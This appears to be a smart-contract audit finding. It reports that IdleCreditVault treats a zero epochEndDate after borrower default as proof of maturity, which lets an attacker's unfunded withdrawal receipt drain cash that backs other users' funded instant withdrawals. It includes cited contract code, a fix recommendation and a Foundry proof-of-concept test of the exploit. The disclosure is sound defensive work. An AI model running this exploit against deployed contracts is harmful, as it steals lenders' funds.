### Title
Immature withdrawals can drain funded instant claims after borrower default - (`contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault._claimFundedWithdrawRequest` treats `epochEndDate == 0` as proof that every normal withdrawal receipt is funded and mature, but borrower default also sets `epochEndDate` to zero without incrementing `epochNumber` or funding the pending withdrawal bucket. An unprivileged lender can request a withdrawal, wait for the next epoch to default, and immediately claim that immature receipt against underlying already held by the strategy for funded instant withdrawals. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
A normal withdrawal request immediately increments `withdrawsRequests[_user]`, records the request under the current `epochNumber`, and adds its value to `pendingWithdraws`, but the underlying is transferred to the strategy only by `collectWithdrawFunds` during a successful `stopEpoch`. [4](#0-3) [5](#0-4) 

The funded-claim path enforces the one-epoch delay only while `epochEndDate != 0`; once the CDO reports a zero end date, the check is skipped entirely and the aggregate `withdrawsRequests` balance is burned and paid at par. [6](#0-5) 

Borrower default sets `epochEndDate = 0` while leaving the pending receipt unfunded and leaving `epochNumber` equal to the receipt's request epoch. [7](#0-6) [8](#0-7) 

The payout helper sends any non-reserved underlying held by `IdleCreditVault`, with no check that the specific normal receipt was funded by `collectWithdrawFunds`. [9](#0-8) 

Funded instant-withdraw receipts create exactly such non-reserved strategy cash because `collectInstantWithdrawFunds` decreases `pendingInstantWithdraws` and leaves the underlying in the strategy until users claim. [10](#0-9) 

### Impact Explanation
An attacker can receive an immature normal withdrawal at par by spending underlying that belongs to funded instant-withdrawal receipts. The instant recipients are then unable to claim before recovery finalization because the backing was already transferred, or the shortfall is absorbed by default-recovery funds. In a concrete configuration, a 10,000-underlying pending receipt can drain 10,000 of a 20,000-underlying funded instant queue, freezing the victim's remaining claim and converting an unfunded receipt into an immediate par payout. [11](#0-10) [9](#0-8) 

### Likelihood Explanation
The attacker only needs to be an allowed lender who creates a withdrawal request and calls `claimWithdrawRequest` after an honest borrower default; both actions are available through the unprivileged CDO entry points. [12](#0-11) [13](#0-12) 

The attack is conditional on a borrower default occurring while funded instant withdrawals remain unclaimed, but neither condition requires the attacker to control the borrower, manager, owner, queue, or Keyring. The existing `epochNumber` check explicitly ceases to apply in the defaulted state, and the funded-claim helper does not distinguish funded principal from merely requested principal. [1](#0-0) [9](#0-8) 

### Recommendation
Do not use `epochEndDate == 0` as a blanket maturity or funding signal. Track whether a withdrawal receipt was actually funded, either through a `fundedWithdraws` ledger or per-epoch funding status, and pay `_claimFundedWithdrawRequest` only for that funded balance. At minimum, preserve the `epochNumber > lastWithdrawRequest[_user]` requirement when `defaulted == true`, and reserve the immediate closed-pool bypass exclusively for receipts created after a successful `_interest == 1` pool close. [6](#0-5) [14](#0-13) 

### Proof of Concept
The following Foundry regression test follows the existing helpers in `test/foundry/IdleCreditVault.t.sol`. A victim creates a funded instant receipt in one epoch, the attacker creates a normal pending receipt in the next buffer, the borrower defaults, and the attacker's immature receipt drains the victim's funded cash.

```solidity
// test/foundry/IdleCreditVault.t.sol
function testImmatureWithdrawRequestStealsFundedInstantClaimsAfterDefault() external {
  IdleCreditVault creditVault = IdleCreditVault(address(strategy));
  address victim = makeAddr('funded-instant-victim');
  address attacker = makeAddr('pending-normal-attacker');

  uint256 victimAmount = 20_000 * ONE_SCALE;
  uint256 attackerAmount = 10_000 * ONE_SCALE;

  _depositWithUser(victim, victimAmount, true);
  _depositWithUser(attacker, attackerAmount, true);

  // Finish epoch 0 with a sufficiently lower APR so victim's request is instant.
  _startEpochAndCheckPrices(0);
  _stopEpochAndCheckPrices(0, initialProvidedApr / 2, _expectedFundsEndEpoch());

  vm.prank(victim);
  uint256 instantClaim = cdoEpoch.requestWithdraw(0, address(AAtranche));

  // Epoch 1 starts, funds the instant request, and leaves that cash in the strategy.
  _startEpochAndCheckPrices(1);
  assertEq(underlying.balanceOf(address(creditVault)), instantClaim);

  // Finish epoch 1 with no qualifying APR decrease, so the next request is normal.
  _stopEpochAndCheckPrices(1, initialProvidedApr, _expectedFundsEndEpoch());

  vm.prank(attacker);
  uint256 pendingClaim = cdoEpoch.requestWithdraw(0, address(AAtranche));
  assertLt(pendingClaim, instantClaim);

  uint256 requestEpoch = creditVault.epochNumber();
  assertEq(creditVault.lastWithdrawRequest(attacker), requestEpoch);

  _startEpochAndCheckPrices(2);

  // Honest borrower default: epochEndDate is set to zero before pending normal
  // withdrawals are funded and before epochNumber can mature the request.
  deal(defaultUnderlying, borrower, 0, true);
  vm.warp(cdoEpoch.epochEndDate() + 1);
  vm.prank(manager);
  cdoEpoch.stopEpoch(0, 0);
  assertTrue(cdoEpoch.defaulted());
  assertEq(cdoEpoch.epochEndDate(), 0);
  assertEq(creditVault.epochNumber(), requestEpoch);
  assertEq(creditVault.withdrawsRequests(attacker), pendingClaim);

  // The zero end date bypasses the one-epoch check and spends victim-backed cash.
  uint256 attackerBalanceBefore = underlying.balanceOf(attacker);
  vm.prank(attacker);
  cdoEpoch.claimWithdrawRequest();
  assertEq(underlying.balanceOf(attacker) - attackerBalanceBefore, pendingClaim);

  // The victim's funded instant receipt is now undercollateralized/frozen.
  vm.prank(victim);
  vm.expectRevert();
  cdoEpoch.claimInstantWithdrawRequest();
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L277-294)
```text
    if (!isClosed) {
      // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
      pendingWithdraws += _amount;
    }
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L320-349)
```text
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L380-402)
```text
  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
  }

  /// @notice collect the instant withdraw funds
  /// @dev only IdleCDO can call this function
  /// @param _amount number of tokens to collect
  function collectInstantWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    if (_amount == 0) return;
    pendingInstantWithdraws -= _amount;
    underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L411-429)
```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L897-907)
```text
  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L211-224)
```text

    // Crystallize the strategy-token rebalance so virtualPrice/tranchePrice expose the realized loss.
    _forceUpdateAccounting();

    expectedEpochInterest = 0;
    pendingWithdrawFees = 0;
    allowAAWithdrawRequest = true;
    allowBBWithdrawRequest = true;
    // This flag gates claimInstantWithdrawRequest. New instant requests stay disabled below.
    allowInstantWithdraw = true;
    disableInstantWithdraw = true;
    epochDuration = 0;
    epochEndDate = 0;
    _setScaledApr(0);
```

**File:** contracts/IdleCDOEpochVariant.sol (L488-493)
```text
      if (_isRequestingAllFunds) {
        // user will request only normal withdraw and can claim right after
        disableInstantWithdraw = true;
        epochDuration = 0;
        epochEndDate = 0;
      }
```

**File:** contracts/IdleCDOEpochVariant.sol (L501-505)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
    }
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-790)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);

    // Programmable borrower deployments do not support instant withdrawals.
    // If apr decresed wrt last epoch, request instant withdraw and burn tranche tokens directly
    // we compare unscaled aprs
    if (_isInstantWithdrawEnabled()) {
      uint256 currentApr = creditVault.unscaledApr();
      if (lastEpochApr > (currentApr + instantWithdrawAprDelta)) {
        // burn strategy tokens from cdo and mint an equal amount to msg.sender as receipt
        creditVault.requestInstantWithdraw(_underlyings, msg.sender);
        // burn tranche tokens and decrease NAV
        _withdrawOps(_amount, _underlyings, _tranche);
        return _underlyings;
      }
    }

    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
```

**File:** contracts/IdleCDOEpochVariant.sol (L967-970)
```text
  function claimWithdrawRequest() external {
    // underlyings requested, here we check that user waited at least one epoch and that borrower
    // did not default upon repayment (old requests can still be claimed)
    IdleCreditVault(strategy).claimWithdrawRequest(msg.sender);
```
